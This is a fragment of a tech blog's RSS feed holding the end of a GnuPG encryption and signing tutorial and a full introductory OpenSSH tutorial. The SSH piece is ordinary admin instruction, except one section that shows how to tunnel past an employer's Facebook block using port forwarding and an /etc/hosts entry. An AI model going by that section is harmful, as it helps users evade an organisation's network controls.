alice@home:~$ gpg --armor --encrypt --output message.asc --recipient &#39;Tiberiu&#39; message.txt</code></pre>
<p>A new file named <code>message.asc</code> is now created. Alice can send me this file.</p>
<pre><code>alice@home:~$ cat message.asc
-----BEGIN PGP MESSAGE-----
Version: GnuPG v1.4.10 (GNU/Linux)

hIwDKyvxP+TvsrQBA/9F+PmSWDC1g8W3QXbs7EcmQs7s5ogfoowBlnTBT7m1oa51
nlsYlXjb5oW1mUzv57YSYbzlZ04i1CAQ70U6TF5bKfMRlk7djS/dGLMbQ1HQ5KIZ
awuCAqHgtSJfbDWR7Xkn1rOXf4yBpfQslVA985pIRAVgj4YDe2c3jKFAEVx1k9JU
AUwL9KI4xDLuqlcw46AMGi4kaVkMAupMyJvprzi8gJIV03dYAQkqxmTsWNF9v6G3
b24kv0jSyAQFMkNarjZiuCf30J8eWaeGzhessqghSC7Vo35T
=Iasq
-----END PGP MESSAGE-----</code></pre>
<p>The above is the encrypted message.</p>
<p>Alice want to assure me that she is the author of the message. Thus, she signs the message with <strong>her</strong> private key. This is because anyone can use my public key to send me any message.</p>
<pre><code>alice@home:~$ gpg --armor --output message.sig --detach-sign message.txt

You need a passphrase to unlock the secret key for
user: &quot;Alice &lt;alice@home.com&gt;&quot;
1024-bit RSA key, ID BD806C61, created 2012-09-13

Enter passphrase: *****</code></pre>
<p>This is the signature of encrypted message with Alice’s private key.</p>
<pre><code>alice@home:~$ cat message.sig
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iJwEAAECAAYFAlBR8D4ACgkQBukbhL2AbGHLcAQAs4ou17+K9X1SS3P19PlO8OLO
jLLPEWq3+I8cU0gAXtB4U5SoTs66ZhlHBUtwMCwnLv7HBSQVnkdiRoRrxS7wtw5E
DhDWoioc4ZpGsoRsohCsGATSftUv5JHOXEEKsuOZ1pU8Icv2YLcSs9x+mLhxkbCm
6worbXhtndC4Xm3YsWc=
=12ip
-----END PGP SIGNATURE-----</code></pre>
<p>Alice now sends me the two files: <code>message.asc</code> - message and <code>message.sig</code> - signature to prove her identity.</p>
<p>Decrypt the message from Alice:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --output message_from_alice.txt --decrypt message.asc
gpg: encrypted with 1024-bit RSA key, ID 4255F703, created 2012-09-13
      &quot;Tiberiu (This is my PGP key) &lt;email@host.com&gt;&quot;
tibi@tbarbu-pc:~$ cat message_from_alice.txt
Hello Tiberiu</code></pre>
<p>How can I be sure this message comes from Alice? I have to import Alice’s public key. She previously sent me in an e-mail.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --import alice.asc
gpg: key BD806C61: public key &quot;Alice &lt;alice@home.com&gt;&quot; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)</code></pre>
<p>I can verify the authenticity of Alice’s message:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --verify message.sig message_from_alice.txt
gpg: Signature made Thu 13 Sep 2012 05:48:55 PM EEST using RSA key ID BD806C61
gpg: Good signature from &quot;Alice &lt;alice@home.com&gt;&quot;</code></pre>
<p>If the verification fails, here is how it looks:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --verify message.sig message_from_alice.txt
gpg: Signature made Thu 13 Sep 2012 05:39:58 PM EEST using RSA key ID BD806C61
gpg: BAD signature from &quot;Alice &lt;alice@home.com&gt;&quot;</code></pre>
<p>So what makes GnuPG differ from Digital Signing if both of them use the same algorithms, the same hash functions? Also I can not be sure that Alice’s public key is the real one. <a href="https://en.wikipedia.org/wiki/Web_of_trust">Web of trust</a> is the concept used in GnuPG. Here we do not need a centralized Certificate Authority (CA) because web of trust is a descentralized model where people trust each other (and their keys). You self-sign your documents, you are your own CA. You will be able to trust people you have met and also they have friends, thus you trust their friends. And so on. Think of a big community where people trust each other. The following picture will show you how this work.</p>
<p><img style="float:center" src='/images/web_of_trust.png' alt="Web of trust"
width="625" height="578"/></p>
<p>How can you trust people and people trust you?</p>
<p>If I want to trust Bob because yesterday I went out to a party and interacted with new friends, then I ask Bob to share with me his public key. I import his key and check the fingerprint and UID, then I trust him signing his key:</p>
<pre><code>tibi@tbarbu-pc:~/.gnupg$ gpg --import bob.asc
gpg: key 8FA52AD1: public key &quot;Bob Michael &lt;bob@michael.com&gt;&quot; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
tibi@tbarbu-pc:~$ gpg --edit-key bob@michael.com
gpg (GnuPG) 1.4.10; Copyright (C) 2008 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


pub  1024R/8FA52AD1  created: 2012-09-13  expires: never       usage: SC
                     trust: unknown       validity: unknown
sub  1024R/2786E92D  created: 2012-09-13  expires: never       usage: E
[ unknown] (1). Bob Michael &lt;bob@michael.com&gt;

Command&gt; sign

pub  1024R/8FA52AD1  created: 2012-09-13  expires: never       usage: SC
                     trust: unknown       validity: unknown
 Primary key fingerprint: A2F8 0339 479B 6978 0516  9214 10AE FD14 8FA5 2AD1

     Bob Michael &lt;bob@michael.com&gt;

Are you sure that you want to sign this key with your
key &quot;Tiberiu (This is my GPG key) &lt;email@host.com&gt;&quot; (03384551)

Really sign? (y/N) y

Command&gt; quit
Save changes? (y/N) y
tibi@tbarbu-pc:~/.gnupg$ gpg --list-sigs
/space/home/tibi/.gnupg/pubring.gpg
-----------------------------------
pub   1024R/03384551 2012-09-13
uid                  Tiberiu (This is my GPG key) &lt;email@host.com&gt;
sig 3        E4EFB2B4 2012-09-13  Tiberiu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/28847259 2012-09-13
sig          E4EFB2B4 2012-09-13  Tiberiu (This is my GPG key) &lt;email@host.com&gt;

pub   1024R/8FA52AD1 2012-09-13
uid                  Bob Michael &lt;bob@michael.com&gt;
sig 3        8FA52AD1 2012-09-13  Bob Michael &lt;bob@michael.com&gt;
sig          ECB916DC 2012-09-13  Tiberiu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/2786E92D 2012-09-13
sig          8FA52AD1 2012-09-13  Bob Michael &lt;bob@michael.com&gt;</code></pre>
<p>After signing he only has to send his new signed key to all his friends or to a public server.</p>
<p>GnuPG also offer the possibility to send not only encrypted messages to our friends – because sometimes it is not a must to secure out communication –, but signed only. Though the message is clear, it should be signed to confirm the authentication feature provided by GPG. You must be sure that the receiver can trust the content and it comes from a reliable source. We can do this as follows:</p>
<pre><code>tibi@tbarbu-pc:~$ echo &quot;Hello world. This is a plaintext&quot; &gt; clear_message.txt
gpg --clearsign clear_message.txt</code></pre>
<p>A new file <code>clear_message.txt.asc</code> is created, containing the following:</p>
<pre><code>tibi@tbarbu-pc:~$ cat clear_message.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hello world. This is a plaintext
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iJwEAQECAAYFAlBW5u8ACgkQo0DCbuy5FtxmiAQApRWX9/D48NnX8OEVzf4rrCFw
agE5U/0MUyp5zLTU6o1pM3Oj5qDrJCeUjmHfworLFw/rGy5wcfU0S6plgWmvrZMZ
roT/qVfAyNwDijRZb/INy8UEBd9am+8LyCjC1pJgKv5HqBbvyDNYTcB/EBa2YjUU
5iP5s3AbfsA0Gb5by30=
=Mrjv
-----END PGP SIGNATURE-----</code></pre>
<p>As you can see the message is signed and the authenticity can be verified:</p>
<pre><code>alice@home:~$ gpg --verify clear_message.txt.asc
gpg: Signature made Mon 17 Sep 2012 12:01:35 PM EEST using RSA key ID ECB916DC
gpg: Good signature from &quot;Tiberiu (This is my GPG key) &lt;email@home.com&gt;&quot;</code></pre>
<p><a href="http://www.youtube.com/watch?v=gBzJGckMYO4">That’s all folks</a>. Thank you and I hope you find this guide useful.</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Tue, 18 Sep 2012 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/from-0-to-cryptography.html</guid>
</item>
<item>
    <title>Introduction to SSH</title>
    <link>http://techblog.rosedu.org/intro-to-ssh.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/intro-to-ssh.html" title="Introduction to SSH">Introduction to SSH</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on September 10, 2012</span>
      by
      <span class="author">Silviu-Mihai Popescu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/SSH.html">SSH</a>, <a href="/tags/security.html">security</a>, <a href="/tags/remote%20access.html">remote access</a></span>
      </span>

      <p>This is an article aiming to familiarize the reader with the features and benefits of using <a href="https://en.wikipedia.org/wiki/Secure_Shell" title="SSH">Secure Shell (SSH)</a>, particularly with the <a href="http://www.openssh.org/" title="OpenSSH">OpenSSH</a> implementation. SSH is an application level protocol used for secure data communication, whether that means remote shell access, command execution, file transfer and some other aspects described in this article. It was meant to be a replacement for existing insecure remote shell protocols such as <code>telnet</code>, <code>rsh</code> and <code>rexec</code> which send information in plaintext, including usernames and passwords.</p>
<p>SSH uses <a href="https://en.wikipedia.org/wiki/Public-key_cryptography" title="public-key cryptography">public-key cryptography</a> for authentication purposes. In short, this works like this: each user has a pair of keys, one public and one private. They are mathematically related, but it is computationally infeasible to derive one from the other. The public key is … well, public! Anyone can get that, and they would use it to encrypt messages. The private key, however, is (or should be) accessible only by the user, and used to decrypt incoming messages.</p>
<p>The two parties of a SSH communication are the server and the client. The server usually runs on port 22, but that is not a requirement, and the client will use a random available port on the client machine.</p>
<h3 id="setting-up-ssh">Setting up SSH</h3>
<p>The simplest way to install a SSH client is with your package manager. On Debian-based distros, it would be something like:</p>
<pre><code>$ sudo apt-get install openssh-client</code></pre>
<p>After that finishes, you can generate a pair of cryptographic keys using the command <code>ssh-keygen</code>:</p>
<pre><code>$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/silviu/.ssh/id_rsa): test
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in test.
Your public key has been saved in test.pub.
The key fingerprint is:
eb:8b:a9:c5:22:46:c8:36:d9:c1:40:67:e1:b3:ec:66 silviu@keter
The key&#39;s randomart image is:
+--[ RSA 2048]----+
|.o +.            |
|  *              |
|   =             |
|..+ +            |
|.=.+    S        |
|..o  .   .       |
|  oE. o .        |
| .o. o +         |
|    ..o o.       |
+-----------------+</code></pre>
<p>The lines ending in colon represent where you have to provide input. You may have noticed the word <code>passphrase</code>. This is used to lock the private key with a string that you choose. In order to use that key pair, the passphrase is provided and checked locally, not transmitted over the network. Please do not mistake this for the remote password.</p>
<p>The default size for the RSA key is 2048 bits. You can change this and other aspects by checking the manual page for <code>ssh-keygen</code>,</p>
<p>On the server you would install the <code>openssh-server</code> package:</p>
<pre><code>$ sudo apt-get install openssh-server</code></pre>
<p>Among other things, this should put a script in <code>/etc/init.d/ssh</code> and start the server. Depending on whether you distro uses <code>inittab</code> or <code>upstart</code>, you can check if the server is running with the following commands:</p>
<pre><code>$ /etc/init.d/ssh status
$ service ssh status</code></pre>
<p>You can start the server by passing <code>start</code> as the last argument in those commands, but you’d also need root access to do that.</p>
<p>And now you can test the installation from the client like this:</p>
<pre><code>$ ssh my_user@my.server.com</code></pre>
<p>By default, this will try to connect to the specified server on port 22, using the default key at <code>~/.ssh/id_rsa</code>. You can change this behaviour by a quick glance at the manual page. Also, if you specified a passphrase during the generation of the key, you will have to provide that and the remote password for the user you are trying to log on as. You can specify the IP instead of the DNS name for the server.</p>
<p>You can also run just one line of commands, such as:</p>
<pre><code>$ ssh my_user@my.server.com &#39;ls -la; apt-get moo&#39;</code></pre>
<p>So this would be the basic usage of SSH. You can do a lot just with what is written up to this point, and you might be tempted to close the article and just get back to what you wanted to do in the first place. But seriously, you would be missing a lot of the cool stuff SSH can do. Just <a href="https://xkcd.com/365/" title="XKCD">bear with me for a moment</a> and you will end up being more productive with SSH.</p>
<h3 id="copying-files-remotely">Copying files remotely</h3>
<p>You can use <code>cat</code> and pipes to copy a file remotely:</p>
<pre><code>$ cat test.txt | ssh -e none user@host &#39;cat &gt; remote_test.txt&#39;</code></pre>
<p>The <code>-e</code> option disables escape characters so that you can send any bytes that your file may contain. The rest is a trick: the output of the remote <code>cat</code> is redirected to a file, but the input comes from the output of the first half of the pipe, which is the contents of the file you want to transfer. Neat, right?</p>
<p>However, that solution is kind of tedious. Instead you would better use <code>scp</code>, which comes with the package:</p>
<pre><code>$ scp test.txt user@host:remote_test.txt</code></pre>
<p>Notice that colon after host because it is critical. If you did not want to rename the file you would have just used <code>user@host:</code>. The colon tells scp the destination is a remote location. Otherwise, you would just copy <code>test.txt</code> to a file named <code>user@host</code>.</p>
<p>Also, the path after the colon is relative to the home directory of the remote user.</p>
<p>There is also the <code>sftp</code> utility which provides a FTP-like interface.</p>
<h3 id="passwordless-authentication">Passwordless authentication</h3>
<p>So, up until now you have connected via SSH by providing your password, maybe even a passphrase. You can probably see by now that this is troublesome and can be a major drawback if you would like to make a script using SSH. How about we ditch that remote password?</p>
<p>To do this, you would basically need to append the contents of your public key to a file located at <code>~/.ssh/authorized_keys</code> on the server.</p>
<p>Luckily for you, most SSH packages provide an utility called <code>ssh-copy-id</code> that does just that. So you would just run:</p>
<pre><code>$ ssh-copy-id user@host</code></pre>
<p>Next time you will try to log on to that account, you will not be prompted for your password.</p>
<p>As an exercise, knowing what you have read thus far, figure out two more ways of achieving the same result, just in case you do not have <code>ssh-copy-id</code>.</p>
<h3 id="config-file">Config file</h3>
<p>If you are going to use SSH with several servers, with various settings and different key pairs you will soon have to enter something like this:</p>
<pre><code>$ ssh -i ~/.ssh/private_key_file10 -l user -p 2222 -o &quot;ForwardX11 yes&quot; the.mother.of.all.servers.com</code></pre>
<p>Now that is an extremely long and ugly line with no particular purpose but to illustrate the complexity of ssh commands. Some who have read the manual page know that X forwading can be achieved by passing <code>-X</code>.</p>
<p>Anyway, an initial approach to bypassing this issue is by using aliases of bash functions. But those are limited in functionality and basically you are just placing that ugly command somewhere else. Not cool, not cool.</p>
<p>You can put settings on your local computer in <code>~/.ssh/config</code>. The full list of options, and their possible values, is available via <code>man ssh_config</code>.</p>
<p>Here is a modified version of my config file, for security reasons:</p>
<pre><code>Host compilers
	User ubuntu
	Hostname ec2-50-17-91-154.compute-1.amazonaws.com
	IdentityFile /home/silviu/.ssh/amazon
Host *.cs.pub.ro
	User you_d_like_to_know
	IdentityFile /home/silviu/.ssh/cs
Host so2-lin
	User root
	Hostname 192.168.56.101
	PubkeyAuthentication no
Host so-lin
	User student
	Hostname 10,0.2,15
	PubkeyAuthentication no
Host ubuntu-dev
	User silviu
	Hostname 172.16.48.129
	PubkeyAuthentication no
Host github
	User git
	Hostname github.com
	PreferredAuthentications publickey
	IdentityFile ~/.ssh/github</code></pre>
<p>Now you could put all those options for that long command above in a organized manner, and it will work with all SSH-related utilities, even <code>scp</code>, with the options you specified:</p>
<pre><code>$ scp something mother:</code></pre>
<h3 id="local-port-forwarding">Local port forwarding</h3>
<p>Let’s assume that your employer has banned Facebook, so that people might actually do something useful.</p>
<p>Let’s also assume that you have a SSH server that you can reach and has no filtering for Facebook.</p>
<p>You could do something like this</p>
<pre><code>$ ssh your.server.com -L 80:facebook.com:80</code></pre>
<p>This achieves the following effect: any connection to port 80 on your machine is passed, via your remote machine, to port 80 on facebook.com, which is the standard port for HTTP. After that, set an entry matching facebook.com to 127.0.0.1 in <code>/etc/hosts</code> and procrastinate.</p>
<p>But first, take a moment to come up with a section in your config file that does this forwarding. (Hint: <code>LocalForward</code>)</p>
<h3 id="conclusions">Conclusions</h3>
<p>So now you have a set of things you could do with SSH that can make you be more productive (or not if you just read the last part). I hope you found the article useful.</p>
<p>If you want to know about more things you could do with SSH here is a list of terms you might want to search the web for: * SSH tunnels * SSH remote port forwarding * Set up a SOCKS proxy for Firefox with SSH * sshfs * SSH master sessions * ssh-agent and ssh-reagent</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Mon, 10 Sep 2012 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/intro-to-ssh.html</guid>
</item>

    </channel> 
</rss>
